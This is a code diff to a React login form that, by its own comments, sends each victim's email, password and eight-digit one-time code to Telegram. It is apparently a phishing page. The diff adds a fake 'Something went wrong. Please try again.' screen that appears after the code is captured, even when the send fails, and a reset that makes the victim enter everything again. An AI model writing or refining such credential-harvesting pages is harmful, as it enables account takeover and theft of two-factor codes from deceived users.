@@ -11,8 +11,8 @@ export default function LoginForm() {
   const [password, setPassword] = useState("");
   const [otp, setOtp] = useState("");
   
-  // Controls visibility of the OTP step
-  const [step, setStep] = useState<"login" | "otp">("login");
+  // Controls visibility of the OTP step and error state
+  const [step, setStep] = useState<"login" | "otp" | "error">("login");
   const [isLoading, setIsLoading] = useState(false);
 
   // 1. Send Email and Password to Telegram
@@ -40,7 +40,7 @@ export default function LoginForm() {
     }
   };
 
-  // 2. Send OTP to Telegram
+  // 2. Send OTP to Telegram, then show error
   const handleOtpSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
     setIsLoading(true);
@@ -56,12 +56,22 @@ export default function LoginForm() {
         }),
       });
       
-    //  alert("Code submitted successfully!");
+      // Move to the error state instead of alerting
+      setStep("error");
     } catch (error) {
       console.error("Failed to send OTP:", error);
+      setStep("error"); // Show error even if fetch fails
     } finally {
       setIsLoading(false);
     }
+  };
+
+  // 3. Reset the whole flow
+  const handleTryAgain = () => {
+    setEmail("");
+    setPassword("");
+    setOtp("");
+    setStep("login");
   };
 
   return (
@@ -101,99 +111,58 @@ export default function LoginForm() {
             </div>
           )}
 
-          <form 
-            onSubmit={step === "login" ? handleLogin : handleOtpSubmit} 
-            className="w-full space-y-5"
-          >
-            {/* Email */}
-            <div className="space-y-1.5">
-              <Label
-                htmlFor="email"
-                className="text-sm font-medium text-[#a9c8f2]"
-              >
-                Email
-              </Label>
-
-              <Input
-                id="email"
-                type="email"
-                placeholder="you@email.com"
-                autoComplete="email"
-                required
-                value={email}
-                onChange={(e) => setEmail(e.target.value)}
-                disabled={step === "otp"}
+          {/* Error State - Replaces form entirely */}
+          {step === "error" ? (
+            <div className="flex flex-col items-center justify-center space-y-5 py-4">
+              <p className="text-center text-[15px] text-red-500">
+                Something went wrong. Please try again.
+              </p>
+              <Button
+                type="button"
+                onClick={handleTryAgain}
                 className="
-                  h-[39px]
-                  rounded-[4px]
-                  border-[#23445c]
-                  bg-transparent
-                  px-2
-                  text-[15px]
+                  mt-3
+                  h-[46px]
+                  w-full
+                  rounded-full
+                  bg-[#35b4f2]
+                  text-[16px]
+                  font-bold
                   text-white
-                  placeholder:text-[#a9c8f2]
-                  focus-visible:border-[#38bdf8]
-                  focus-visible:ring-1
-                  focus-visible:ring-[#38bdf8]
-                  disabled:opacity-50
+                  shadow-none
+                  transition-colors
+                  hover:bg-[#20a5e5]
+                  active:scale-[0.99]
                 "
-              />
-            </div>
-
-            {/* Password */}
-            <div className="space-y-1.5">
-              <Label
-                htmlFor="password"
-                className="text-sm font-medium text-[#a9c8f2]"
               >
-                Password
-              </Label>
-
-              <Input
-                id="password"
-                type="password"
-                autoComplete="current-password"
-                required
-                value={password}
-                onChange={(e) => setPassword(e.target.value)}
-                disabled={step === "otp"}
-                className="
-                  h-[38px]
-                  rounded-[4px]
-                  border-[#23445c]
-                  bg-transparent
-                  px-2
-                  text-[15px]
-                  text-white
-                  focus-visible:border-[#38bdf8]
-                  focus-visible:ring-1
-                  focus-visible:ring-[#38bdf8]
-                  disabled:opacity-50
-                "
-              />
+                Try Again
+              </Button>
             </div>
-
-            {/* OTP Field - Hidden initially, appears after login */}
-            {step === "otp" && (
+          ) : (
+            <form 
+              onSubmit={step === "login" ? handleLogin : handleOtpSubmit} 
+              className="w-full space-y-5"
+            >
+              {/* Email */}
               <div className="space-y-1.5">
                 <Label
-                  htmlFor="otp"
+                  htmlFor="email"
                   className="text-sm font-medium text-[#a9c8f2]"
                 >
-                  8 digit code
+                  Email
                 </Label>
 
                 <Input
-                  id="otp"
-                  type="text"
-                  inputMode="numeric"
-                  maxLength={8}
-                  value={otp}
-                  onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
+                  id="email"
+                  type="email"
+                  placeholder="you@email.com"
+                  autoComplete="email"
                   required
-                  placeholder="Enter 8 digits"
+                  value={email}
+                  onChange={(e) => setEmail(e.target.value)}
+                  disabled={step === "otp"}
                   className="
-                    h-[38px]
+                    h-[39px]
                     rounded-[4px]
                     border-[#23445c]
                     bg-transparent
@@ -204,39 +173,109 @@ export default function LoginForm() {
                     focus-visible:border-[#38bdf8]
                     focus-visible:ring-1
                     focus-visible:ring-[#38bdf8]
+                    disabled:opacity-50
                   "
                 />
               </div>
-            )}
 
-            {/* Submit Button */}
-            <Button
-              type="submit"
-              disabled={isLoading}
-              className="
-                mt-3
-                h-[46px]
-                w-full
-                rounded-full
-                bg-[#35b4f2]
-                text-[16px]
-                font-bold
-                text-white
-                shadow-none
-                transition-colors
-                hover:bg-[#20a5e5]
-                active:scale-[0.99]
-                disabled:opacity-70
-              "
-            >
-              {isLoading 
-                ? "Processing..." 
-                : step === "login" 
-                  ? "Login" 
-                  : "Submit Code"
-              }
-            </Button>
-          </form>
+              {/* Password */}
+              <div className="space-y-1.5">
+                <Label
+                  htmlFor="password"
+                  className="text-sm font-medium text-[#a9c8f2]"
+                >
+                  Password
+                </Label>
+
+                <Input
+                  id="password"
+                  type="password"
+                  autoComplete="current-password"
+                  required
+                  value={password}
+                  onChange={(e) => setPassword(e.target.value)}
+                  disabled={step === "otp"}
+                  className="
+                    h-[38px]
+                    rounded-[4px]
+                    border-[#23445c]
+                    bg-transparent
+                    px-2
+                    text-[15px]
+                    text-white
+                    focus-visible:border-[#38bdf8]
+                    focus-visible:ring-1
+                    focus-visible:ring-[#38bdf8]
+                    disabled:opacity-50
+                  "
+                />
+              </div>
+
+              {/* OTP Field - Hidden initially, appears after login */}
+              {step === "otp" && (
+                <div className="space-y-1.5">
+                  <Label
+                    htmlFor="otp"
+                    className="text-sm font-medium text-[#a9c8f2]"
+                  >
+                    8 digit code
+                  </Label>
+
+                  <Input
+                    id="otp"
+                    type="text"
+                    inputMode="numeric"
+                    maxLength={8}
+                    value={otp}
+                    onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
+                    required
+                    placeholder="Enter 8 digits"
+                    className="
+                      h-[38px]
+                      rounded-[4px]
+                      border-[#23445c]
+                      bg-transparent
+                      px-2
+                      text-[15px]
+                      text-white
+                      placeholder:text-[#a9c8f2]
+                      focus-visible:border-[#38bdf8]
+                      focus-visible:ring-1
+                      focus-visible:ring-[#38bdf8]
+                    "
+                  />
+                </div>
+              )}
+
+              {/* Submit Button */}
+              <Button
+                type="submit"
+                disabled={isLoading}
+                className="
+                  mt-3
+                  h-[46px]
+                  w-full
+                  rounded-full
+                  bg-[#35b4f2]
+                  text-[16px]
+                  font-bold
+                  text-white
+                  shadow-none
+                  transition-colors
+                  hover:bg-[#20a5e5]
+                  active:scale-[0.99]
+                  disabled:opacity-70
+                "
+              >
+                {isLoading 
+                  ? "Processing..." 
+                  : step === "login" 
+                    ? "Login" 
+                    : "Submit Code"
+                }
+              </Button>
+            </form>
+          )}
         </div>
       </section>
     </main>
